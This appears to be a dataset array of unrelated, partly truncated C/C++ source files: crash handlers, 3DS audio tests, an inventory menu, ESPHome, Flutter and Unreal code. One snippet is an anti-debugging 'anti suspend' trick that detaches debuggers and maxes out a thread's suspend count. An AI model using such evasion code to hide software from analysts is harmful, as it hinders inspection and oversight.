DWORD exceptionCode = exceptionRecord->ExceptionCode;\n\n        switch (exceptionCode)\n        {\n        case EXCEPTION_BREAKPOINT:\n            break;\n        case EXCEPTION_ACCESS_VIOLATION:\n            reportCrash(\"Critical exception: Access Violation (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_ARRAY_BOUNDS_EXCEEDED:\n            reportCrash(\"Critical exception: Array Bounds Exceeded (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_DENORMAL_OPERAND:\n            reportCrash(\"Critical exception: Invalid floating-point operation (denormal operand) (0x\", exceptionCode,\n                        inputFile);\n            break;\n\n        case EXCEPTION_FLT_DIVIDE_BY_ZERO:\n            reportCrash(\"Critical exception: Floating-point division by zero (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_OVERFLOW:\n            reportCrash(\"Critical exception: Floating-point overflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_STACK_CHECK:\n            reportCrash(\"Critical exception: Hardware floating-point stack overflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_UNDERFLOW:\n            reportCrash(\"Critical exception: Floating-point underflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_ILLEGAL_INSTRUCTION:\n            reportCrash(\"Critical exception: Illegal instruction encountered (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_IN_PAGE_ERROR:\n            reportCrash(\"Critical exception: Page fault (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEP",
    "#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <ctime>\n#include <cmath>\n#include <cfenv>\n\n#include <3ds.h>\n\n#include \"audio.h\"\n\n// Very slow triangle wave, mono PCM16\nvoid fillBuffer(u32 *audio_buffer, size_t size) {\n    for (size_t i = 0; i < size; i++) {\n        u32 data = i * 2;\n        audio_buffer[i] = ((data+1)<<16) | ((data)&0xFFFF);\n    }\n\n    DSP_FlushDataCache(audio_buffer, size);\n}\n\nvoid waitForKey() {\n    while (aptMainLoop()) {\n        gfxSwapBuffers();\n        gfxFlushBuffers();\n        gspWaitForVBlank();\n\n        hidScanInput();\n        u32 kDown = hidKeysDown();\n\n        if (kDown)\n            break;\n    }\n}\n\nint main(int argc, char **argv) {\n    gfxInitDefault();\n\n    PrintConsole botScreen;\n    PrintConsole topScreen;\n\n    consoleInit(GFX_TOP, &topScreen);\n    consoleInit(GFX_BOTTOM, &botScreen);\n    consoleSelect(&topScreen);\n\n    constexpr size_t NUM_SAMPLES = 160*200;\n    u32 *audio_buffer = (u32*)linearAlloc(NUM_SAMPLES * sizeof(u32));\n    fillBuffer(audio_buffer, NUM_SAMPLES);\n\n    AudioState state;\n    {\n        auto dspfirm = loadDspFirmFromFile();\n        if (!dspfirm) {\n            printf(\"Couldn't load firmware\\n\");\n            goto end;\n        }\n        auto ret = audioInit(*dspfirm);\n        if (!ret) {\n            printf(\"Couldn't init audio\\n\");\n            goto end;\n        }\n        state = *ret;\n    }\n\n    {\n        constexpr float rate_multiplier = 0.67f;\n        printf(\"rate_multiplier = %f\\n\", rate_multiplier);\n\n        array<s32, 160> expected_output;\n        {\n            int position = -2;\n            float fractional_position = 0.f;\n            for (int i=0; i<160; i++) {\n                const s32 x0 = position > 0 ? position : 0;\n\n                fractional_position += rate_multiplier;\n                position += int(fractional_position);\n                fractional_position -= int(fractional_position);\n\n                expected_output[i] = x0;\n            }\n        }\n\n        state.waitForSync();\n        initSharedMem(state);\n        state.write().dsp_configuration->mixer1_enabled_dirty = true;\n        state.write().dsp_configuration->mixer1_enabled = true;\n        state.write().source_configurations->config[0].gain[1][0] = 1.0;\n        state.write().source_configurations->config[0].gain_1_dirty = true;\n        state.notifyDsp();\n        printf(\"init\\n\");\n\n        {\n            u16 buffer_id = 0;\n\n            state.write().source_configurations->config[0].play_position = 0;\n            state.write().source_configurations->config[0].physical_address = osConvertVirtToPhys(audio_buffer);\n            state.write().source_configurations->config[0].length = NUM_SAMPLES;\n            state.write().source_configurations->config[0].mono_or_stereo = DSP::HLE::SourceConfiguration::Configuration::MonoOrStereo::Mono;\n            state.write().source_configurations->config[0].format = DSP::HLE::SourceConfiguration::Configuration::Format::PCM16;\n            state.write().source_configurations->config[0].fade_in = false;\n            state.write().source_configurations->config[0].adpcm_dirty = false;\n            state.write().source_configurations->config[0].is_looping = false;\n            state.write().source_configurations->config[0].buffer_id = ++buffer_id;\n            state.write().source_configurations->config[0].partial_reset_flag = true;\n            state.write().source_configurations->config[0].play_position_dirty = true;\n            state.write().source_configurations->config[0].embedded_buffer_dirty = true;\n\n            state.write().source_configurations->config[0].enable = true;\n            state.write().source_configurations->config[0].enable_dirty = true;\n\n            state.write().source_configurations->config[0].rate_multiplier = rate_multiplier;\n            state.write().source_configurations->config[0].rate_multiplier_dirty = true;\n            state.write().source_configurations->config[0].interpolation_mode = DSP::HLE::SourceConfiguration::Configuration::InterpolationMode::None;\n            state.write().source_configurations->config[0].interpolation_dirty = true;\n\n            state.notifyDsp();\n\n            bool continue_reading = true;\n            for (size_t frame_count = 0; continue_reading && frame_count < 10; frame_count++) {\n                state.waitForSync();\n\n                for (size_t i = 0; i < 160; i++) {\n                    if (state.write().intermediate_mix_samples->mix1.pcm32[0][i]) {\n                        printf(\"[intermediate] frame=%i, sample=%i\\n\", frame_count, i);\n                        for (size_t j = 0; j < 60; j++) {\n                            printf(\"%08lx \", (u32)state.write().intermediate_mix_samples->mix1.pcm32[0][j]);\n                        }\n                        continue_reading = false;\n                        printf(\"\\n\");\n                        break;\n                    }\n                }\n\n                state.notifyDsp();\n            }\n\n            printf(\"expect:\\n\");\n            for (size_t j = 0",
    "#include <iostream>\r\n#include <Windows.h>\r\n#include <thread>\r\n\r\nclass c_globals {\r\npublic:\r\n    HANDLE hThread; // thread handle we create.\r\n    int count = 128; // amount of times we suspend\r\n\r\n    // class to store all our information.\r\n}; static c_globals* globals = new c_globals();\r\n\r\nint main() {\r\n    \r\n    globals->hThread = CreateThread(NULL, 0, 0, NULL, 0, NULL); // dummy thread to base detections from.\r\n\r\n    DebugActiveProcessStop(GetCurrentProcessId()); // self explanatory \r\n\r\n    for (size_t i = 0; i < globals->count; ++i) {\r\n        SuspendThread(globals->hThread); // max out the limit.\r\n    }\r\n\r\n    while (globals->hThread != reinterpret_cast<HANDLE>((DWORD)-1))\r\n    {\r\n        if (SuspendThread(globals->hThread) != (DWORD)-1) {\r\n            std::cout << \"Anti Suspend Activated. \\n\" << std::endl;\r\n            std::cin.get(); // here i chose to just stop everything, in a real case scenario you would send a notifaction or kill the program.\r\n        }\r\n        std::cout << \"we are good. \\n\"; // here you do nothing. || real case scenario this should be threaded.\r\n    }\r\n\r\n    CloseHandle(globals->hThread);\r\n}\r\n",
    "#include <iostream>\n#include <cctype>\n#include \"Tienda.h\"\n#include \"Producto.h\"\n#include \"ProductoAlimenticio.h\"\n#include \"ProductoElectronico.h\"\n#include <sstream>\n\nbool contieneSoloLetras(const std::string& str) {\n    for (char c : str) {\n        if (!std::isalpha(c)) {\n            return false;\n        }\n    }\n    return true;\n}\nbool contieneSoloDigitos(const std::string& str) {\n    for (char c : str) {\n        if (!std::isdigit(c)) {\n            return false;\n        }\n    }\n    return true;\n}\n\nbool esNumeroDecimal(const std::string& str) {\n    std::istringstream iss(str);\n    double temp;\n    iss >> std::noskipws >> temp;\n    return iss.eof() && !iss.fail();\n}\n\n\nint main() {\n    Tienda tienda;\n\n    int opcion;\n    do {\n        //Menu Principal del programa\n        std::cout << \"\\n=== MENU ===\" << std::endl;\n        std::cout << \"1. Agregar Producto\" << std::endl;\n        std::cout << \"2. Eliminar Producto\" << std::endl;\n        std::cout << \"3. Buscar Producto\" << std::endl;\n        std::cout << \"4. Mostrar Inventario\" << std::endl;\n        std::cout << \"5. Filtrar Productos por Precio\" << std::endl;\n        std::cout << \"6. Copiar Producto\" << std::endl;\n        std::cout << \"7. Salir\" << std::endl;\n        std::cout << \"Seleccione una opcion:\\n \";\n        std::cin >> opcion;\n\n        switch (opcion) {\n            case 1: {\n                //Agregar producto\n                std::string idStr;\n                int id;\n                std::string nombre;\n                std::string precioStr;\n                double precio;\n                int stock;\n                std::string fechaCaducidad;\n                std::string modelo;\n                int tipoProducto;\n                //Menu de tipo de productos\n                do {\n                    std::cout << \"Ingrese el tipo de producto\\n 1-Producto\\n 2-Producto Alimenticio\\n 3-Producto Electronico\\nSeleccione una opcion:\\n \";\n                    std::cin >> tipoProducto;\n                } while (tipoProducto < 1 || tipoProducto > 3);\n                //Pedir al usuario q ingrese el ID del producto hasta q contenga solo numeros\n                do {\n                    std::cout << \"Ingrese el ID del producto:\\n \";\n                    std::cin >> idStr;\n                    if (!contieneSoloDigitos(idStr)) {\n                        std::cerr << \"El ID del producto debe contener solo digitos.\" << std::endl;\n                    }\n                } while (!contieneSoloDigitos(idStr));\n\n                // Convertir la cadena de ID a entero\n                id = std::stoi(idStr);\n\n                // Pedir al usuario q ingrese el nombre hasta q contenga solo letras\n                do {\n                    std::cout << \"Ingrese el nombre del producto:\\n \";\n                    std::cin >> nombre;\n                    if (!contieneSoloLetras(nombre)) {\n                        std::cerr << \"El nombre del producto debe contener solo letras.\" << std::endl;\n                    }\n                } while (!contieneSoloLetras(nombre));\n                //Pedir al usuario q ingrese el precio del producto hasta q contenga solo numeros\n                do {\n                    std::cout << \"Ingrese el precio del producto:\\n \";\n                    std::cin >> precioStr;\n                    if (!esNumeroDecimal(precioStr)) {\n                        std::cerr << \"El precio del producto debe ser un numero.\" << std::endl;\n                    }\n                } while (!esNumeroDecimal(precioStr));\n                precio = std::stod(precioStr); // Convertir la cadena de precio a double\n                //Pedir al usuario q ingrese el stock del producto hasta q contenga solo numeros\n                do {\n                    std::cout << \"Ingrese el stock del producto:\\n \";\n                    std::cin >> stock;\n                    if (!esNumeroDecimal(std::to_string(stock))) {\n                        std::cerr << \"El stock del producto debe ser un n\u00famero entero.\" << std::endl;\n                    }\n                } while (!esNumeroDecimal(std::to_string(stock)));\n\n                if (tipoProducto == 2) {\n                    std::cout << \"Ingrese la fecha de caducidad del producto alimenticio: \";\n                    std::cin >> fechaCaducidad;\n                    tienda.agregarProducto(new ProductoAlimenticio(id, nombre, precio, stock, fechaCaducidad));\n                } else if (tipoProducto == 3) {\n                    std::cout << \"Ingrese el modelo del producto electronico: \";\n                    std::cin >> modelo;\n                    tienda.agregarProducto(new ProductoElectronico(id, nombre, precio, stock, modelo));\n                } else {\n                    tienda.agregarProducto(new Producto(id, nombre, precio, stock));\n                }\n\n                break;\n            }\n            case 2: {\n                int id;\n                std::cout << \"Ingrese el ID del producto a eliminar:\\n \";\n                std::cin >> id;\n                tienda.eliminarProducto(id);\n            ",
    "#include \"nabu.h\"\n\n#ifdef USE_ESP_IDF\n\n#include <driver/i2s.h>\n#include <string.h>\n\n#include <vector>\n\n// #include <audio_element.h>\n// #include <audio_event_iface.h>\n// #include <audio_pipeline.h>\n// #include <downmix.h>\n// #include <driver/i2s.h>\n// #include <filter_resample.h>\n// #include <http_stream.h>\n// #include <i2s_stream.h>\n// #include <mp3_decoder.h>\n// #include <raw_stream.h>\n\n// #include \"i2s_stream_mod.h\"\n// #include \"sdk_ext.h\"\n\n// #define INDEX_MUSIC_STREAM 0\n// #define INDEX_TTS_STREAM 1\n// #define TRANSMIT_TIME 500\n\n#include \"esphome/core/log.h\"\n\nnamespace esphome {\nnamespace nabu {\n\nstatic const char *const TAG = \"nabu\";\n\nvoid NabuComponent::setup() {\n  // audio_event_iface_cfg_t evt_cfg = AUDIO_EVENT_IFACE_DEFAULT_CFG();\n  // this->pipeline_event_ = audio_event_iface_init(&evt_cfg);\n\n  // this->setup_pipeline_mix_();\n  // this->setup_pipeline_music_();\n  // this->setup_pipeline_tts_();\n  // this->setup_pipeline_mic_();\n\n  // audio_pipeline_run(this->pipeline_mic_);\n}\n\nvoid NabuComponent::loop() {\n  // audio_event_iface_msg_t msg{};\n  // audio_event_iface_listen(this->pipeline_event_, &msg, 0);\n\n  // if (this->state_ == State::STARTING) {\n  //   ESP_LOGD(TAG, \"Starting mix pipeline\");\n  //   audio_pipeline_run(this->pipeline_mix_);\n  // this->state_ = State::IDLE;\n\n  // this->play_music(\"http://192.168.68.75:8000/Charly%20Bliss/Young%20Enough/\"\n  //                  \"06%20-%20Young%20Enough.mp3\");\n  // }\n  // audio_event_iface_discard(this->pipeline_event_);\n\n  // if ((this->state_ == State::PREPARING_MUSIC) &&\n  //     (audio_element_get_state(this->mp3_decoder_) == AEL_STATE_RUNNING)) {\n  //   audio_element_info_t music_info{};\n  //   audio_element_getinfo(this->mp3_decoder_, &music_info);\n  //   ESP_LOGD(TAG, \"Received music info\");\n\n  //   // Change resample filter to match music source\n  //   rsp_filter_change_src_info(this->resample_music_,\n  //   music_info.sample_rates,\n  //                              music_info.channels, music_info.bits);\n\n  //   this->stop_music();\n\n  //   // Run music pipeline\n  //   this->state_ = State::PLAYING_MUSIC;\n  //   audio_element_set_uri(this->http_reader_, this->music_uri_.c_str());\n  //   audio_pipeline_run(this->pipeline_music_);\n  // }\n}\n\n// ----------------------------------------------------------------------------\n\nvoid NabuComponent::start_i2s() {\n  if (this->i2s_started_) {\n    return;\n  }\n\n  ESP_LOGD(TAG, \"Starting I2S\");\n  i2s_driver_config_t i2s_driver_cfg = {\n      .mode = (i2s_mode_t)(I2S_MODE_SLAVE | I2S_MODE_RX | I2S_MODE_TX),\n      .sample_rate = 16000,\n      .bits_per_sample = I2S_BITS_PER_SAMPLE_32BIT,\n      // .channel_format = I2S_CHANNEL_FMT_ONLY_LEFT,\n      .channel_format = I2S_CHANNEL_FMT_RIGHT_LEFT,\n      .communication_format = I2S_COMM_FORMAT_STAND_I2S,\n      .intr_alloc_flags = ESP_INTR_FLAG_LEVEL1,\n      .dma_buf_count = 8,\n      .dma_buf_len = 128,\n      // .dma_buf_count = 4,\n      // .dma_buf_len = 256,\n      .use_apll = false,\n      .tx_desc_auto_clear = false,\n      // .tx_desc_auto_clear = true,\n      // .fixed_mclk = 0,\n      // .fixed_mclk = 24576000,\n      // .mclk_multiple = I2S_MCLK_MULTIPLE_DEFAULT,\n      .bits_per_chan = I2S_BITS_PER_CHAN_DEFAULT,\n  };\n  i2s_driver_install(this->get_port(), &i2s_driver_cfg, 0, nullptr);\n\n  i2s_pin_config_t pin_config = this->get_pin_config();\n  i2s_set_pin(this->get_port(), &pin_config);\n  this->i2s_started_ = true;\n}\n\nvoid NabuComponent::play_music(const std::string &uri) {\n  // this->stop_music();\n\n  ESP_LOGD(TAG, \"Playing: %s\", uri.c_str());\n  // this->music_uri_ = uri;\n  // audio_element_set_uri(this->http_reader_, this->music_uri_.c_str());\n  // audio_element_set_uri(this->http_reader_, uri.c_str());\n  // audio_pipeline_run(this->pipeline_music_);\n\n  // Preroll HTTP reader and MP3 decoder to get music info (see loop)\n  // this->state_ = State::PREPARING_MUSIC;\n\n  // if (audio_element_run(this->http_reader_) != ESP_OK) {\n  //   ESP_LOGE(TAG, \"Starting http reader failed\");\n  // }\n  // if (audio_element_run(this->mp3_decoder_) != ESP_OK) {\n  //   ESP_LOGE(TAG, \"Starting MP3 decoder failed\");\n  // }\n  // if (audio_element_resume(this->http_reader_, 0, 2000 / portTICK_RATE_MS) !=\n  //     ESP_OK) {\n  //   ESP_LOGE(TAG, \"Resuming http reader failed\");\n  // }\n  // if (audio_element_resume(this->mp3_decoder_, 0, 2000 / portTICK_RATE_MS) !=\n  //     ESP_OK) {\n  //   ESP_LOGE(TAG, \"Resuming MP3 decoder failed\");\n  // }\n\n  // ESP_LOGD(TAG, \"Waiting for music info\");\n}\n\nvoid NabuComponent::stop_music() {\n  // audio_pipeline_stop(this->pipeline_music_);\n  // audio_pipeline_reset_items_state(this->pipeline_music_);\n  // audio_pipeline_reset_ringbuffer(this->pipeline_music_);\n}\n\nvoid NabuComponent::pause_music() {\n  // audio_pipeline_pause(this->pipeline_music_);\n}\n\nvoid NabuComponent::resume_music() {\n  // audio_pipeline_resume(this->pipeline_music_);\n}\n\n// ----------------------------------------------------------------------------\n\n// void NabuComponent::setup_pipeline_mix_() {\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    Se",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <string>\n#include <complex>\n#include <vector>\n#include <functional>\n\n#include \"ArithmeticOps.h\"\n#include \"FFTHelperFuncs.h\"\n#include \"TypeManipulation.h\"\n\n\n// Function: numvec1 + numvec2\nstd::string add(std::string numstr1, std::string numstr2)\n{\n    std::vector<int> num1 = convertNumStr2Vec(numstr1);\n    std::vector<int> num2 = convertNumStr2Vec(numstr2);\n\n    return convertNumVec2Str(add(num1, num2));\n}\n// Function: numvec1 + numvec2\nstd::vector<int> add(std::vector<int> num1, std::vector<int> num2)\n{\n    // Error Check\n    num1 = convertNumStr2Vec(convertNumVec2Str(num1));\n    num2 = convertNumStr2Vec(convertNumVec2Str(num2)); \n\n    int num1_len = num1.size(), num2_len = num2.size();\n\n    // Swap if num2 has extra digit(s)\n    if (num2_len > num1_len)\n    {\n        std::vector<int> temp = num1;\n        num1 = num2;\n        num2 = temp;\n\n        int temp_len = num1_len;\n        num1_len = num2_len;\n        num2_len = temp_len;\n    }\n\n    num1.push_back(0); // Extend length by 1, to store possible carry value\n\n    std::vector<int> result (num1_len >= num2_len ? num1_len+1 : num2_len + 1, 0);   \n\n    int next_digit = 0;\n    int carry_val = 0, digitwise_sum = 0;\n    int num1_ind = 0;\n    \n    // Digitwise add and propagate carry value, for number of digits in num2\n    for(int num2_ind = 0; num2_ind <= num2_len - 1; num2_ind++)\n    {\n        digitwise_sum = num1[num1_ind] + num2[num2_ind];\n        carry_val = digitwise_sum/10;\n        digitwise_sum = digitwise_sum%10;\n        result[num1_ind] = digitwise_sum;\n\n        int count = 1;\n        while(carry_val == 1)\n        {\n            next_digit = num1[num1_ind+count];\n            \n            if (next_digit == 9)\n            {\n                num1[num1_ind+count] = 0;                \n                count++;\n            }\n            else\n            {\n                num1[num1_ind+count] = next_digit + carry_val;      \n                carry_val = 0;          \n            }            \n        }\n        num1_ind++;\n    }\n\n    // Store digits of num1 to result that are beyond the number of digits in num2\n    while (num1_ind<=num1_len)\n    {\n        result[num1_ind] = num1[num1_ind];\n        num1_ind++;\n    }\n\n    return removePrecedingZeros(result);\n}\n\n// Function: numvec1 - numvec2\nstd::string subtract(std::string numstr1, std::string numstr2)\n{\n    std::vector<int> num1 = convertNumStr2Vec(numstr1);\n    std::vector<int> num2 = convertNumStr2Vec(numstr2);\n\n    return convertNumVec2Str(subtract(num1, num2));\n}\n\n// Function: numvec1 - numvec2\n// Assumes: num1 > num2\nstd::vector<int> subtract(std::vector<int> num1, std::vector<int> num2)\n{\n    // Error Check\n    num1 = convertNumStr2Vec(convertNumVec2Str(num1));\n    num2 = convertNumStr2Vec(convertNumVec2Str(num2)); \n\n    int compare_num1_num2_val = compareNum1andNum2(num1, num2);\n    if (compare_num1_num2_val == -1)\n    { \n        throw std::invalid_argument(\"Num1 needs to ge be greater than Num2, only compatible with positive integers.\");\n    }\n    else if (compare_num1_num2_val == 0)\n    {\n        return (std::vector<int>{0});\n    }\n\n    int num1_len = num1.size(), num2_len = num2.size();    \n    std::vector<int> result (num1.size(), 0);   \n\n    int num1_digit = 0, num2_digit = 0;\n    int next_digit = 0;\n    int borrow_val = 0, digitwise_diff = 0;\n\n    int num1_ind = 0;\n    \n    // Digitwise subtract and propagate borrow value, for number of digits in num2\n    for(int num2_ind = 0; num2_ind < num2_len; num2_ind++)\n    {\n        if (num1[num1_ind] >= num2[num2_ind])\n        {\n            digitwise_diff = num1[num1_ind]-num2[num2_ind]; // Perform digitwise subtraction\n            borrow_val = 0;\n        }\n        else\n        {\n            digitwise_diff = 10+num1[num1_ind]-num2[num2_ind]; \n            borrow_val = 1;\n        }\n\n        result[num1_ind] = digitwise_diff;\n\n        int count = 1;\n        while(borrow_val == 1)\n        {\n            next_digit = num1[num1_ind+count];\n            \n            if (next_digit == 0)\n            {\n                num1[num1_ind + count] = 9;                \n                count++;\n            }\n            else\n            {\n                num1[num1_ind + count] = next_digit - borrow_val;      \n                borrow_val = 0;          \n            }            \n        }\n\n        num1_ind++;\n    }\n\n    // Store digits of num1 to result that are beyond the number of digits in num2\n    while (num1_ind < num1_len)\n    {        \n        result[num1_ind] = num1[num1_ind];\n        num1_ind++;\n    }    \n\n    return removePrecedingZeros(result);\n}\n\n// Function: numvec1 * numvec2, Long Multiplication\nstd::string mulLong(std::string numstr1, std::string numstr2)\n{\n    std::vector<int> num1 = convertNumStr2Vec(numstr1);\n    std::vector<int> num2 = convertNumStr2Vec(numstr2);\n\n    return convertNumVec2Str(mulLong(num1, num2));\n}\n\n// Function: numvec1 * numvec2, Long Multiplication\nstd::vector<int> mulLong(std::vector<int> num1, std::vector<int> num2)\n{     \n    // Error ",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n/*===========================================================================\n\tGenerated code exported from UnrealHeaderTool.\n\tDO NOT modify this manually! Edit the corresponding .h files instead!\n===========================================================================*/\n\n#include \"UObject/GeneratedCppIncludes.h\"\n#include \"ManagerUI/Public/Widgets/MainMenuWidget.h\"\nPRAGMA_DISABLE_DEPRECATION_WARNINGS\nvoid EmptyLinkFunctionForGeneratedCodeMainMenuWidget() {}\n// Cross Module References\n\tMANAGERUI_API UClass* Z_Construct_UClass_UButtonWidget_NoRegister();\n\tMANAGERUI_API UClass* Z_Construct_UClass_UMainMenuWidget();\n\tMANAGERUI_API UClass* Z_Construct_UClass_UMainMenuWidget_NoRegister();\n\tMANAGERUI_API UClass* Z_Construct_UClass_UWidgetReactionInterface_NoRegister();\n\tUMG_API UClass* Z_Construct_UClass_UUserWidget();\n\tUPackage* Z_Construct_UPackage__Script_ManagerUI();\n// End Cross Module References\n\tDEFINE_FUNCTION(UMainMenuWidget::execQuitGame)\n\t{\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->QuitGame();\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(UMainMenuWidget::execStartGame)\n\t{\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->StartGame();\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(UMainMenuWidget::execOnPreheatFinished)\n\t{\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->OnPreheatFinished();\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(UMainMenuWidget::execAsyncLevelLoad)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_LevelDir);\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_LevelName);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->AsyncLevelLoad(Z_Param_LevelDir,Z_Param_LevelName);\n\t\tP_NATIVE_END;\n\t}\n\tvoid UMainMenuWidget::StaticRegisterNativesUMainMenuWidget()\n\t{\n\t\tUClass* Class = UMainMenuWidget::StaticClass();\n\t\tstatic const 